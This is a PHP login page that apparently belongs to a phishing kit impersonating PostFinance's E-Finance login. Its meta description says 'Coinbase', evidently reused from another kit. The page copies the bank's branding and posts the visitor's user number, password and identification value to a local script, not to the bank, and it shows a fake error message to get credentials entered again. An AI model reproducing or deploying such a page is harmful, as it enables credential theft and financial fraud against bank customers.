<?php
  session_start();
  include "./Assets/php/lang/lang.php";
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Assets/imgs/favicon.ico">
        <title>E-Finance Login | PostFinance</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Assets/css/style.css">
        <script src="./Assets/js/stutes.js"></script>             
    </head>
    <body>

      <!-- header -->
      <header class="header_1">
        <div class="part_1">
          <div class="container_part1 d-flex align-items-center justify-content-end">
            <p class="d-flex align-items-center mb-0"><?php echo get_text('p_1_1'); ?> <img src="./Assets/imgs/arrow.svg" alt=""></p>
          </div>
        </div>
        <div class="part_2">
          <div class="container_part2 d-flex align-items-center justify-content-between">
            <div class="logo">
              <img src="./Assets/imgs/logo.svg" alt="">
            </div>
            <div class="bars">
              <img src="./Assets/imgs/bars.svg" alt="">
              <p class="mb-0"><?php echo get_text('p_1_24'); ?></p>
            </div>
          </div>
        </div>
      </header>

      <!-- wrapper_login -->
      <div class="wrapper_login">
        <div class="container_login">
          <?php if( isset($_GET['error']) ) : ?>
          <div class="error d-flex align-items-start">
            <img src="./Assets/imgs/error.png" alt="">
            <div class="txt">
              <p class="mb-0"><?php echo get_text('p_1_2'); ?></p>
              <p class="mb-0"><?php echo get_text('p_1_3'); ?></p>
            </div>
          </div>
          <?php endif; ?>          
          <div class="title">
            <h1><?php echo get_text('p_1_4'); ?></h1>
          </div>
          <div class="box_login d-flex">
            <div class="part_left">
              <form action="./Assets/php/config/func.php" method="POST">
                <input type="hidden" name="log">
                <div class="inputes">
                  <div class="form-group input_box">
                    <label for="nom"><?php echo get_text('p_1_5'); ?> <img src="./Assets/imgs/infos.png" alt=""></label>
                    <div class="input_group">
                      <input type="text" name="nom" id="nom" required inputmode="numeric">
                    </div>
                  </div>
                  <div class="form-group input_box">
                    <label for="pass"><?php echo get_text('p_1_6'); ?></label>
                    <div class="input_group">
                      <input type="password" name="pass" id="pass" required>
                    </div>
                    <div class="forget">
                      <a href=""><?php echo get_text('p_1_7'); ?> <i class="ri-arrow-right-s-line"></i></a>
                    </div>
                  </div>
                  <div class="form-group input_box">
                    <h5><?php echo get_text('p_1_8'); ?></h5>
                    <label for="ident"><?php echo get_text('p_1_9'); ?> <img src="./Assets/imgs/infos.png" alt=""></label>
                    <div class="input_group">
                      <input type="text" name="ident" id="ident">
                    </div>
                  </div>                  
                </div>
                <div class="btn_sub">
                  <button type="submit"><?php echo get_text('p_1_10'); ?></button>
                </div>
              </form>
            </div>
            <div class="part_right">
              <div class="box1">
                <div class="title">
                  <h1><?php echo get_text('p_1_11'); ?></h1>
                </div>
                <div class="qr d-flex justify-content-center">
                </div>
                <p><?php echo get_text('p_1_12'); ?></p>
                <div class="links">
                  <a href=""><?php echo get_text('p_1_13'); ?> <i class="ri-arrow-right-s-line"></i></a>
                </div>
              </div>
              <div class="box1">
                <div class="title">
                  <h1><?php echo get_text('p_1_14'); ?></h1>
                </div>
                <div class="links2">
                  <a href=""><?php echo get_text('p_1_15'); ?> <i class="ri-arrow-right-s-line"></i></a>
                  <a href=""><?php echo get_text('p_1_16'); ?> <i class="ri-arrow-right-s-line"></i></a>
                  <a href=""><?php echo get_text('p_1_17'); ?> <i class="ri-arrow-right-s-line"></i></a>
                  <a href=""><?php echo get_text('p_1_18'); ?> <i class="ri-arrow-right-s-line"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>


      <!-- footer -->
      <div class="footer_1">
        <div class="container_footer d-flex align-items-center justify-content-between">
          <div class="part_left">
            <ul class="ps-0 mb-0">
              <li><?php echo get_text('p_1_19'); ?> <i class="ri-arrow-right-s-line"></i></li>
              <li><?php echo get_text('p_1_20'); ?> <i class="ri-arrow-right-s-line"></i></li>
            </ul>
          </div>
          <div class="part_right">
            <div class="btns d-flex align-items-center">
              <button><p class="mb-0"><img src="./Assets/imgs/hil.png" alt=""> <?php echo get_text('p_1_21'); ?></p><i class="ri-arrow-down-s-line"></i></button>
              <button><p class="mb-0"><?php echo get_text('p_1_22'); ?></p><i class="ri-arrow-down-s-line"></i></button>
            </div>
            <p class="mb-0"><?php echo get_text('p_1_23'); ?></p>
          </div>
        </div>
      </div>







        







        <!-- bootstrap -->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <!-- script jquery -->
        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>        
        <script src="./Assets/js/script.js"></script>
        
        <script>
          $('#nom').mask('000000000000000000000000000000000');
          
        </script>
    </body>
</html>